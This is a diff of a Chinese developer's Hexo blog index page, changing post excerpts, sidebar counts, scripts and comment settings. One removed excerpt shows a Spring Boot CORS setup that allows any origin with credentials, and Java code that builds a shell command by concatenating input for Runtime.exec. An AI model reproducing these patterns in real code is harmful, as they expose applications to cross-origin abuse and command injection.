-    <a title="valine" href="/2022/08/31/springboot%E9%98%B2%E5%BE%A1xss%E7%9A%84%E6%96%B9%E6%B3%95%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/2022/08/31/springboot%E9%98%B2%E5%BE%A1xss%E7%9A%84%E6%96%B9%E6%B3%95%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>对springBoot防御xss的一般方法的学习</p>
+<h2 id="jdk低版本"><a href="#jdk低版本" class="headerlink" title="jdk低版本"></a>jdk低版本</h2>
           <!--noindex-->
             <div class="post-button">
-              <a class="btn" href="/2022/08/31/springboot%E9%98%B2%E5%BE%A1xss%E7%9A%84%E6%96%B9%E6%B3%95%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/26/java%E5%A4%9A%E7%BA%BF%E7%A8%8B%E4%B8%8B%E8%BD%BD%E5%99%A8%E8%AE%B0%E5%BD%95/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/../images/avatar.PNG">
-      <meta itemprop="name" content="blueSatchel">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="blueSatchel's blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/08/26/java%E5%A4%9A%E7%BA%BF%E7%A8%8B%E4%B8%8B%E8%BD%BD%E5%99%A8%E8%AE%B0%E5%BD%95/" class="post-title-link" itemprop="url">java多线程下载器</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-08-26 19:09:49" itemprop="dateCreated datePublished" datetime="2022-08-26T19:09:49+08:00">2022-08-26</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-09-01 18:08:06" itemprop="dateModified" datetime="2022-09-01T18:08:06+08:00">2022-09-01</time>
-              </span>
-
-          
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Valine：</span>
-    
-    <a title="valine" href="/2022/08/26/java%E5%A4%9A%E7%BA%BF%E7%A8%8B%E4%B8%8B%E8%BD%BD%E5%99%A8%E8%AE%B0%E5%BD%95/#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/2022/08/26/java%E5%A4%9A%E7%BA%BF%E7%A8%8B%E4%B8%8B%E8%BD%BD%E5%99%A8%E8%AE%B0%E5%BD%95/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>简单的java多线程下载器的学习记录</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2022/08/26/java%E5%A4%9A%E7%BA%BF%E7%A8%8B%E4%B8%8B%E8%BD%BD%E5%99%A8%E8%AE%B0%E5%BD%95/">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/04/java%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/../images/avatar.PNG">
-      <meta itemprop="name" content="blueSatchel">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="blueSatchel's blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/08/04/java%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" class="post-title-link" itemprop="url">java多线程学习记录</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-08-04 22:46:29" itemprop="dateCreated datePublished" datetime="2022-08-04T22:46:29+08:00">2022-08-04</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-09-09 23:53:09" itemprop="dateModified" datetime="2022-09-09T23:53:09+08:00">2022-09-09</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/java/" itemprop="url" rel="index"><span itemprop="name">java</span></a>
-                </span>
-            </span>
-
-          
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Valine：</span>
-    
-    <a title="valine" href="/2022/08/04/java%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/2022/08/04/java%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>java多线程学习记录</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2022/08/04/java%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/18/%E8%83%8C%E5%BF%98%E5%BD%95%E9%A1%B9%E7%9B%AE%E5%BC%80%E5%8F%91%E8%AE%B0%E5%BD%95/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/../images/avatar.PNG">
-      <meta itemprop="name" content="blueSatchel">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="blueSatchel's blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/07/18/%E8%83%8C%E5%BF%98%E5%BD%95%E9%A1%B9%E7%9B%AE%E5%BC%80%E5%8F%91%E8%AE%B0%E5%BD%95/" class="post-title-link" itemprop="url">背忘录项目开发记录</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-07-18 21:17:06" itemprop="dateCreated datePublished" datetime="2022-07-18T21:17:06+08:00">2022-07-18</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-07-29 18:40:40" itemprop="dateModified" datetime="2022-07-29T18:40:40+08:00">2022-07-29</time>
-              </span>
-
-          
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Valine：</span>
-    
-    <a title="valine" href="/2022/07/18/%E8%83%8C%E5%BF%98%E5%BD%95%E9%A1%B9%E7%9B%AE%E5%BC%80%E5%8F%91%E8%AE%B0%E5%BD%95/#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/2022/07/18/%E8%83%8C%E5%BF%98%E5%BD%95%E9%A1%B9%E7%9B%AE%E5%BC%80%E5%8F%91%E8%AE%B0%E5%BD%95/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h3 id="springboot配置跨域请求"><a href="#springboot配置跨域请求" class="headerlink" title="springboot配置跨域请求"></a>springboot配置跨域请求</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.config.annotation.CorsRegistry;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.config.annotation.WebMvcConfigurer;</span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WebMvcConfig</span> <span class="keyword">implements</span> <span class="title">WebMvcConfigurer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addCorsMappings</span><span class="params">(CorsRegistry registry)</span> </span>&#123;</span><br><span class="line">        registry.addMapping(<span class="string">&quot;/**&quot;</span>)</span><br><span class="line">                .allowedHeaders(<span class="string">&quot;Content-Type&quot;</span>,<span class="string">&quot;X-Requested-With&quot;</span>,<span class="string">&quot;accept,Origin&quot;</span>,<span class="string">&quot;Access-Control-Request-Method&quot;</span>,<span class="string">&quot;Access-Control-Request-Headers&quot;</span>,<span class="string">&quot;token&quot;</span>)</span><br><span class="line">                .allowedMethods(<span class="string">&quot;*&quot;</span>)</span><br><span class="line">                .allowedOriginPatterns(<span class="string">&quot;*&quot;</span>)</span><br><span class="line">                .allowCredentials(<span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="验证输入是否为单词"><a href="#验证输入是否为单词" class="headerlink" title="验证输入是否为单词"></a>验证输入是否为单词</h3><p>因为python有一个<code>pyenchant</code>库恰好具备这样的功能</p>
-<p><code>pip install pyenchant</code></p>
-<p>但是java调用python之前并没有接触过</p>
-<p>使用jpython来调用的时候总是报一些很奇怪的错误,要么是找不到第三方库,但是添加了库路径进去又报别的错误</p>
-<p>由于这个地方只需要传递一个简单的单词的参数过去就行</p>
-<p>所以考虑使用命令行传递参数的方式来实现,将true或者false打印到控制台给java读取</p>
-<p>java只需要拼接命令执行即可</p>
-<h5 id="python代码"><a href="#python代码" class="headerlink" title="python代码"></a>python代码</h5><p>verify.py</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> enchant</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">d = enchant.<span class="type">Dict</span>(<span class="string">&quot;en_US&quot;</span>)</span><br><span class="line"><span class="built_in">input</span>=sys.argv[<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(d.check(<span class="built_in">input</span>))</span><br></pre></td></tr></table></figure>
-
-<p>采用sys库来获取参数,sys库获取到的参数数组中第一个是python后第一对空格包裹的,第二个才是word</p>
-<h5 id="java代码"><a href="#java代码" class="headerlink" title="java代码"></a>java代码</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">String word=<span class="string">&quot;hello&quot;</span>;</span><br><span class="line">      String cmd=<span class="string">&quot;python H:\python\verify.py &quot;</span>+word;</span><br><span class="line">      Process process=<span class="keyword">null</span>;</span><br><span class="line">      process = Runtime.getRuntime().exec(cmd);</span><br><span class="line">      InputStreamReader inputStreamReader = <span class="keyword">new</span> InputStreamReader(process.getInputStream());</span><br><span class="line">      BufferedReader bufferedReader = <span class="keyword">new</span> BufferedReader(inputStreamReader);</span><br><span class="line">      String res=bufferedReader.readLine();</span><br><span class="line">      <span class="keyword">if</span>(res.equals(<span class="string">&quot;True&quot;</span>))&#123;</span><br><span class="line">          System.out.println(<span class="string">&quot;是单词&quot;</span>);</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">          System.out.println(<span class="string">&quot;不是单词&quot;</span>);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>
-
-<p>在windows上面很容易就实现了功能</p>
-<p>在linux上部署则遇见了一个问题<br><code>ImportError: The &#39;enchant&#39; C library was not found and maybe needs to be installed.</code><br>原因按照字面意思就是缺少了enchant这个字符库<br>所以需要进行一下安装<br>CentOS 7安装Enchant：<br><code>yum install enchant</code><br>Ubuntu 安装Enchant：<br><code>apt-get install libenchant1c2a</code></p>
-<p>顺利解决之后改一改路径就可以实现了</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/18/vue%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/../images/avatar.PNG">
-      <meta itemprop="name" content="blueSatchel">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="blueSatchel's blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/07/18/vue%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" class="post-title-link" itemprop="url">vue学习记录</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-07-18 20:38:40" itemprop="dateCreated datePublished" datetime="2022-07-18T20:38:40+08:00">2022-07-18</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-08-23 15:57:22" itemprop="dateModified" datetime="2022-08-23T15:57:22+08:00">2022-08-23</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/vue/" itemprop="url" rel="index"><span itemprop="name">vue</span></a>
-                </span>
-            </span>
-
-          
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Valine：</span>
-    
-    <a title="valine" href="/2022/07/18/vue%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/2022/07/18/vue%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>写第一个vue项目时遇到的一些问题和解决方法</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2022/07/18/vue%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/">
+              <a class="btn" href="/2022/09/23/log4j2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/#more" rel="contents">
                 阅读全文 &raquo;
               </a>
             </div>
@@ -1352,7 +1214,7 @@
       <div class="site-overview-wrap sidebar-panel">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
     <img class="site-author-image" itemprop="image" alt="blueSatchel"
-      src="/../images/avatar.PNG">
+      src="/../images/luoqixi.png">
   <p class="site-author-name" itemprop="name">blueSatchel</p>
   <div class="site-description" itemprop="description"></div>
 </div>
@@ -1361,7 +1223,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">73</span>
+          <span class="site-state-item-count">78</span>
           <span class="site-state-item-name">文章</span>
         </a>
       </div>
@@ -1388,6 +1250,10 @@
 
 
       </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
 
     </div>
   </aside>
@@ -1446,6 +1312,8 @@
 
 <script src="/js/next-boot.js"></script>
 
+<script src="/js/bookmark.js"></script>
+
 
 
 
@@ -1465,6 +1333,26 @@
 
 
 
+<script>
+document.querySelectorAll('.pdfobject-container').forEach(element => {
+  let url = element.dataset.target;
+  let pdfOpenParams = {
+    navpanes : 0,
+    toolbar  : 0,
+    statusbar: 0,
+    pagemode : 'thumbs',
+    view     : 'FitH'
+  };
+  let pdfOpenFragment = '#' + Object.entries(pdfOpenParams).map(([key, value]) => `${key}=${encodeURIComponent(value)}`).join('&');
+  let fullURL = `/lib/pdf/web/viewer.html?file=${encodeURIComponent(url)}${pdfOpenFragment}`;
+
+  if (NexT.utils.supportsPDFs()) {
+    element.innerHTML = `<embed class="pdfobject" src="${url + pdfOpenFragment}" type="application/pdf" style="height: ${element.dataset.height};">`;
+  } else {
+    element.innerHTML = `<iframe src="${fullURL}" style="height: ${element.dataset.height};" frameborder="0"></iframe>`;
+  }
+});
+</script>
 
 
 
@@ -1492,10 +1380,10 @@ NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
       avatar     : 'mm',
       meta       : guest,
       pageSize   : '10' || 10,
-      visitor    : false,
+      visitor    : true,
       lang       : '' || 'zh-cn',
       path       : location.pathname,
-      recordIP   : false,
+      recordIP   : true,
       serverURLs : ''
     });
   }, window.Valine);
